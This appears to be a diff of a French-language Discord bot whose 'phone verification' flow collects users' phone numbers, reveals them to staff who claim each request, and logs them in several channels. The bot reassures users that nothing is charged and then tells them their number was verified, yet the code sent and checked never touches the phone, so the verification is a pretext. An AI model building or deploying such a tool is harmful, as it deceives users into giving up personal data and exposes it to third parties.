@@ -59,29 +59,24 @@ class PhoneModal(discord.ui.Modal, title="📱 Vérification"):
 
     async def on_submit(self, interaction: discord.Interaction):
         now = datetime.datetime.now().timestamp()
-
         if interaction.user.id in cooldowns:
             remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
             if remaining > 0:
                 embed = discord.Embed(title="⏳ Cooldown", description=f"Veuillez attendre **{int(remaining)} secondes** avant de réessayer.", color=0xfee75c)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
         if interaction.user.id in verified_users:
             embed = discord.Embed(title="⏳ Déjà en cours", description="Vous avez déjà une vérification en attente.", color=0xfee75c)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-
         phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
         valid, err_msg = validate_phone(phone_raw)
         if not valid:
             embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-
         cooldowns[interaction.user.id] = now
         guild_name = interaction.guild.name if interaction.guild else "Inconnu"
-
         embed_wait = discord.Embed(
             title="📩 Code de vérification",
             description="✅ **Votre demande a bien été prise en compte !**\n\n📱 Vous allez recevoir un **code de vérification par message privé**.\n⏱️ Cela peut prendre **jusqu'à 5 minutes**.\n💰 **Aucun débit** — 0,00 €\n\n📌 Merci de patienter.",
@@ -89,7 +84,6 @@ class PhoneModal(discord.ui.Modal, title="📱 Vérification"):
         )
         embed_wait.set_footer(text="Vérification • 0,00 €")
         await interaction.response.send_message(embed=embed_wait, ephemeral=True)
-
         await send_log(
             title="📋 Nouvelle demande",
             description=f"**{interaction.user}** a envoyé une demande de vérification.",
@@ -102,7 +96,6 @@ class PhoneModal(discord.ui.Modal, title="📱 Vérification"):
                 ("🕐 Date", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
             ]
         )
-
         await send_staff_panel(interaction.user, phone_raw, guild_name)
 
     async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
@@ -143,17 +136,13 @@ class StaffPanelView(discord.ui.View):
                 embed = discord.Embed(title="❌ Déjà pris", description=f"Cette vérification est déjà prise par <@{self.claimed_by}>.", color=0xed4245)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
             self.claimed_by = interaction.user.id
-
             embed_reveal = discord.Embed(title="📱 Numéro dévoilé", description=f"```\n{self.phone}\n```\n⚠️ Ne partagez pas ce numéro.", color=0x57f287, timestamp=datetime.datetime.now())
             await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
-
             user_fetch = await bot.fetch_user(self.user_id)
             new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="En cours", claimed_by=self.claimed_by, code_status="*En attente...*", timestamp=interaction.message.created_at)
             new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
             await interaction.message.edit(embed=new_embed, view=self)
-
             await send_log(title="📋 Vérification prise en charge", description=f"**{interaction.user.name}** a pris en charge la vérification.", color=0x57f287, fields=[("👮 Staff", f"<@{interaction.user.id}>", True), ("👤 Utilisateur", f"<@{self.user_id}>", True), ("📱 Numéro", f"||{self.phone}||", False)])
         except Exception as e:
             log.error(f"Claim error: {e}")
@@ -170,31 +159,25 @@ class StaffPanelView(discord.ui.View):
                 embed = discord.Embed(title="❌ Personne n'a pris", description="Prenez d'abord la vérification en charge avant d'envoyer le code.", color=0xfee75c)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
             if self.claimed_by != interaction.user.id:
                 embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut envoyer le code.", color=0xed4245)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
             if self.code_sent:
                 embed = discord.Embed(title="⚠️ Déjà envoyé", description="Un code a déjà été envoyé à cet utilisateur.", color=0xfee75c)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
             self.code_value = generate_code()
             self.code_sent = True
             verified_users[self.user_id] = {"code": self.code_value, "phone": self.phone, "claimed_by": interaction.user.id, "guild_name": self.guild_name}
-
             embed_waiting = discord.Embed(title="⏳ Code envoyé", description=f"📱 Un code de vérification a été envoyé à <@{self.user_id}>.\n\n🔐 **Code : `{self.code_value}`**\n\n⏳ En attente de la réponse de l'utilisateur...", color=0xfee75c, timestamp=datetime.datetime.now())
             embed_waiting.set_footer(text="L'utilisateur doit répondre en MP avec le code")
             await interaction.response.send_message(embed=embed_waiting, ephemeral=True)
-
             try:
                 user = await bot.fetch_user(self.user_id)
                 embed_dm = discord.Embed(title="🔐 Code de vérification", description=f"**Votre code de vérification : `{self.code_value}`**\n\nVeuillez **répondre à ce message** avec le code à 4 chiffres.\n\n⚠️ Ne partagez ce code avec personne.", color=0x5865f2)
                 embed_dm.set_footer(text="Répondez avec le code uniquement • 0,00 €")
                 await user.send(embed=embed_dm)
-
                 await send_log(title="🔑 Code envoyé", description=f"Code envoyé à <@{self.user_id}> par **{interaction.user.name}**.", color=0xfee75c, user=user, fields=[("👤 Utilisateur", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("🔐 Code", f"||{self.code_value}||", False)])
             except discord.Forbidden:
                 embed_fail = discord.Embed(title="❌ Échec", description=f"<@{self.user_id}> a ses MP fermés. Impossible d'envoyer le code.", color=0xed4245)
@@ -203,7 +186,6 @@ class StaffPanelView(discord.ui.View):
                 self.code_value = None
                 verified_users.pop(self.user_id, None)
                 return
-
             user_fetch = await bot.fetch_user(self.user_id)
             new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="Code envoyé", claimed_by=self.claimed_by, code_status="✅ Envoyé", timestamp=interaction.message.created_at)
             new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
@@ -223,20 +205,16 @@ class StaffPanelView(discord.ui.View):
                 embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut fermer cette vérification.", color=0xed4245)
                 await interaction.response.send_message(embed=embed, ephemeral=True)
                 return
-
             verified_users.pop(self.user_id, None)
             cooldowns.pop(self.user_id, None)
-
             for child in self.children:
                 if isinstance(child, discord.ui.Button):
                     child.disabled = True
-
             user_fetch = await bot.fetch_user(self.user_id)
             new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="🔒 Fermé", claimed_by=self.claimed_by, code_status="❌ Expiré", timestamp=interaction.message.created_at)
             new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
             new_embed.color = 0xed4245
             await interaction.response.edit_message(embed=new_embed, view=self)
-
             await send_log(title="🔒 Vérification fermée", description=f"Vérification fermée par **{interaction.user.name}**.", color=0xed4245, fields=[("👤 Utilisateur", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("📱 Numéro", f"`{mask_phone(self.phone)}`", False)])
         except Exception as e:
             log.error(f"Close error: {e}")
@@ -250,7 +228,6 @@ async def send_staff_panel(user: discord.User, phone: str, guild_name: str):
     if not channel:
         log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
         return
-
     view = StaffPanelView(user.id, phone, guild_name)
     embed = build_staff_embed(user=user, phone=phone, guild_name=guild_name, status="En attente", claimed_by=None, code_status="*En attente...*")
     embed.set_thumbnail(url=user.display_avatar.url)
@@ -262,15 +239,12 @@ async def handle_dm_code(message: discord.Message):
     pending = verified_users.get(user_id)
     if pending is None:
         return
-
     content = message.content.strip()
-
     valid, err_msg = validate_code(content)
     if not valid:
         embed = discord.Embed(title="❌ Code invalide", description=err_msg, color=0xed4245)
         await message.channel.send(embed=embed)
         return
-
     if content != pending["code"]:
         if content in ["1234","2345","3456","4567","5678","6789","7890","4321","5432","6543","7654","8765","9876","0987"] or len(set(content)) == 1:
             embed = discord.Embed(title="❌ Code invalide", description="Ce code n'est pas valide (chiffres répétés ou séquentiels). Veuillez contacter le staff.", color=0xed4245)
@@ -279,15 +253,12 @@ async def handle_dm_code(message: discord.Message):
         embed = discord.Embed(title="❌ Code incorrect", description="Le code que vous avez entré est incorrect. Veuillez réessayer.", color=0xed4245)
         await message.channel.send(embed=embed)
         return
-
     phone = pending["phone"]
     claimed_by = pending.get("claimed_by")
     guild_name = pending.get("guild_name", "Inconnu")
     verified_users.pop(user_id, None)
-
     embed_success = discord.Embed(title="✅ Vérification réussie !", description="Votre numéro de téléphone a été vérifié avec succès.\nMerci de votre patience.\n\n🔓 Accès autorisé.", color=0x57f287)
     await message.channel.send(embed=embed_success)
-
     log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
     if log_channel:
         embed_log = discord.Embed(title="✅ CODE VALIDÉ", description=f"**Code :** `{content}`", color=0x57f287, timestamp=datetime.datetime.now())
@@ -299,9 +270,7 @@ async def handle_dm_code(message: discord.Message):
         embed_log.set_thumbnail(url=message.author.display_avatar.url)
         embed_log.set_footer(text="Code vérifié avec succès")
         await log_channel.send(content=f"<@{claimed_by}> ✅ Code validé !", embed=embed_log)
-
     await send_log(title="✅ Code validé", description=f"**{message.author.name}** a validé son code.", color=0x57f287, user=message.author, fields=[("👤 Utilisateur", f"<@{user_id}>", True), ("👮 Staff", f"<@{claimed_by}>" if claimed_by else "Inconnu", True), ("🔐 Code", f"||{content}||", True), ("📱 Numéro", f"||{phone}||", False), ("🕐 Validé", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)])
-
     if config.VERIFIED_ROLE_ID and config.GUILD_ID:
         guild = bot.get_guild(config.GUILD_ID)
         if guild:
@@ -324,7 +293,6 @@ async def setup(interaction: discord.Interaction):
         color=0x5865f2
     )
     embed.set_footer(text="Système de vérification automatique")
-
     view = discord.ui.View(timeout=None)
     class VerifyButton(discord.ui.Button):
         def __init__(self):
